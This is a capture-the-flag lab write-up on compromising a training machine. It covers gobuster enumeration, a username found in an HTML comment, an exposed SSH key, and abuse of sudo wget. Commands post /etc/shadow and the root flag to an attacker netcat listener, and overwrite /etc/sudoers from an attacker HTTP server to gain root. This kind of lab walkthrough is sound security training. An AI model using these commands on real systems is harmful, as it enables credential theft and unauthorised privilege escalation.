This room is pretty neat. The initial part got me looking for exploits that did not exist, and getting to the last flag was fun. I liked how a misconfiguration allows getting the root flag in multiple ways. One without even requiring a root shell.

>Note: You should use /dirb/common.txt wordlist for your second scan

1)
```shell
sudo gobuster dir -u http://10.10.77.137/ -w /usr/share/wordlists/dirb/common.txt -o diretorios.txt -k
```

## Initial Access
As I waited for gobuster's second scan to finish, I explored the site in sitemap and did a quick search from which I found Unapp is a theme from colorlib. From this finding, I began looking for exploits and CVEs, but sadly found nothing useful. After trying the contact us button hoping to find a username but ended up with nothing, I decided to analyze the source code. I ended up giving fast on this since the code looked fresh out of the box from the template. At this point, I decided to go back and check the default Apache site, and that's when I found the following.

 <!-- Jessie don't forget to udate the webiste --> (Photo here)

Ha! So we now have our user. 

Gobuster ended up finding an interesting directory called .ssh, so yeah...you can guess what is in that directory. 
(Picture)

So now we should use this key to connect.

## privesc
If we go and see what can we run as root

```shell
sudo -l
```
we see the following
```shell
(root) NOPASSWD: /usr/bin/wget
``` 
being able to run wget as sudo opens up some pretty interesting options since we can send files from this machine to ours or upload files to the machine which will keep the permissions. 

To test this I decided to download the /etc/shadow file. Even though we don't have access to the file, we can exploit the sudo capabilities to achieve it. 

Attacker
```shell
sudo nc -lnvp 1234  
``` 
Target
```shell
sudo wget --post-file=/etc/shadow 10.9.148.82:1234
```

This is where things get funny. Just as we downloaded this file, we can just download the root flag! We just need to use the same syntax that the user flag file had, and we end up with the following command

```shell
sudo wget --post-file=/root/root_flag.txt 10.9.148.82:1234
```

## Root shell
Even though we already have the flag, we clearly haven't pwned the system, so let's do it. For achieving this, we'll do things the other way now, we will upload a file. 

In the /etc folder, there is a file called sudoers. This file specifies which users have sudo access. What if we create our own, and upload it with the wget permissions? 

We can just create a file called sudoers with the next content
```shell
jessie  ALL=(ALL) NOPASSWD: ALL
```
then, let's start an HTTP server on our machine.
```shell
sudo python3 -m http.server 81 
```
following this, we should upload it to the target's etc directory. Since there is already a file called like this, it's important to use the output parameter, so the content is written to the original file.
```shell
sudo wget http://10.9.148.82:81/sudoers --output-document=sudoers
```
Then just run a 
```shell
sudo su
```

And our job here is done.
